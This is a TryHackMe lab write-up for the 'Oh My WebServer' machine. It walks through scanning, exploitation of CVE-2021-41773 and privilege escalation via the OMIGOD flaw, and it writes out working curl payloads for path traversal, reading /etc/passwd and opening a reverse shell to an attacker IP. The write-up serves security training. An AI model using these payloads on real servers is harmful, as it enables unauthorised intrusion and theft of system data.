# Oh My WebServer TryHackMe Writeup
### Level: `Medium` | OS: `Linux`

![logo](1.png)

## Scanning
We run nmap on all ports with scripts and software versions.
![](2.png)

## Enumeration
We access the website and find this page of an active web server:
![](3.png)

We launch **dirsearch** to search for existing directories or files that may be relevant for other attacks.
![](4.png)


## Exploitation
Exploited vulnerability CVE-2021-41773

#### PoC
```bash 
curl -v 'http://ohmyweb.thm/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/bash' -d 'echo Content-Type: text/plain; echo; cat /etc/passwd' -H "Content-Type: text/plain"
```

![](5.png)

### Reverse shell
```bash
curl -v 'http://ohmyweb.thm/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/bash' -d 'echo Content-Type: text/plain; echo; bash -i >& /dev/tcp/10.8.246.129/443 0>&1' -H "Content-Type: text/plain"
```
![](6.png)

### Attack Machine
![](7.png)

It looks like we are on a docker machine and we will need to exit the docker and connect to the host machine.

## Privilege Escalation
There is a script in "*/tmp*"
![](8.png)

The file includes a github to a CVE, reading about this CVE allows privilege escalation on the system.

### Exploit: [https://github.com/midoxnet/CVE-2021-38647](https://github.com/midoxnet/CVE-2021-38647)

#### PoC
![](9.png)

We list the root directory, we could "cheat" and read the flag directly, but the idea is to exploit the vulnerability and get privilege escalation as root.
![](10.png)

We see that the "*id_rsa*" file does not exist, but the "*authorized_keys*" file does exist, remember that the machine has the **SSH** service open, so we will take advantage of the vulnerability to transfer our public key to the file and enter by **SSH** with the "*root*" user.
![](11.png)

We put our public key in the file "*authorized_keys*" exploiting the vulnerability "**OMIGOD**".
![](12.png)

We connect via **SSH** with our private key and read the root flag.
![](13.png)

I almost forgot! We still need to identify the user flag, let's do a **find** in the root directory and we will get it easily.
![](14.png)
---
## About

David Utón is Penetration Tester and security auditor for web and mobiles applications, perimeter networks, internal and industrial corporate infrastructures, and wireless networks.

#### Contacted on:

<img src='https://m3n0sd0n4ld.github.io/imgs/linkedin.png' width='40' align='center'> [David-Uton](https://www.linkedin.com/in/david-uton/)
<img src='https://m3n0sd0n4ld.github.io/imgs/twitter.png' width='43' align='center'> [@David_Uton](https://twitter.com/David_Uton)
